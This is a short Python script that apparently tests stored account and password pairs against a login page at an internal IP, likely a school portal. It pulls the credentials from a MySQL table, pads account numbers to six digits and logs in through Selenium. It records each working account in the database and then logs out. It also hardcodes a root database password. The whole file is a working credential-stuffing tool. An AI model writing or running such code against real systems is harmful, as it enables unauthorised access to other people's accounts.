#   -*-coding:utf-8 -*-
#   @Author: 'ChetWei'
#   @Time: '2018/10/10 23:24'

import pymysql
from selenium_spider import selenium_connect


def find():
    db = pymysql.connect(host='localhost',user='root',password='110811',port=3306,charset='utf8',db='school')
    query_cursor = db.cursor()
    update_cursor = db.cursor()

    query_sql = 'SELECT * FROM new3'
    update_sql = "UPDATE new3 SET is_available = %s WHERE account = %s"


    brower = selenium_connect.SeleniumConnect()
    brower.setUp()

    query_cursor.execute(query_sql)
    results = query_cursor.fetchall()
    for row in results[1153:-1]:
        a = row[0]
        account = row[0]
        password = row[1]
        if len(account) < 6:
            if len(account) == 1:
                account = "00000"+account
            elif len(account) == 2:
                account = "0000"+account
            elif len(account) == 3:
                account = "000" + account
            elif len(account) == 4:
                account = "00"+account
            elif len(account) == 5:
                account = "0"+account
        #登录测试
        try:
            login_res = brower.login(ip='10.110.45.134',account=account,password=password)

            if login_res == 'success':
                print('\033[0;32;m{0}密码正确\033[0m'.format(account))
                #标记数据库
                update_cursor.execute(update_sql, ('1', a))
                db.commit()
                #退出账号
                brower.logout(ip='10.110.45.134',account=account)
            #上一次登录失败
            elif login_res == 'fail':
                print('\033[0;31;m{0}密码错误\033[0m'.format(account))

        except:
            print('\033[0;31;m浏览器错误\033[0m')
            continue

    db.close()


find()

